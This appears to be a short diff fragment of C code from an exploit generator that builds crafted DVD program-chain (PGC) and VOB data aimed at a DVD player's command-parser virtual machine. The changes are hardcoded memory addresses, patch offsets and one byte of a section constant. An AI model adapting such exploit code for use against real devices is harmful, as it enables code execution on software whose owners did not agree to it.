@@ -110,7 +110,6 @@ int generate_exploit_pgc(char *out_path, uint32_t off, uint32_t len, uint32_t ea
 
 #define VOB_PATCH_LOC 0x629
 #define IFO_PGC_PATCH_LOC 0xcc
-#define IFO_CODE_PATCH_LOC 0x25c
 
 #define VM_CMD_PARSER_SWITCH_ADDR 0x00909208
 #define VM_ADDR 0x01558e40
@@ -123,7 +122,7 @@ int generate_exploit_pgc(char *out_path, uint32_t off, uint32_t len, uint32_t ea
 #define INITIAL_COPY_BUF_TARGET (INITIAL_COPY_BUF + (NEEDED_LEN - 24))
 #define CMDT_SA (CTRL_DATA_ADDR - INITIAL_COPY_BUF_TARGET)
 #define EXEC_ADDR (CTRL_DATA_ADDR + 27)
-#define NEW_PGC_SECT "\x00\x00\x00\x2e"
+#define NEW_PGC_SECT "\x00\x00\x00\x32"
 
 int main() {
     printf("CMDT_SA: %x\n", CMDT_SA);
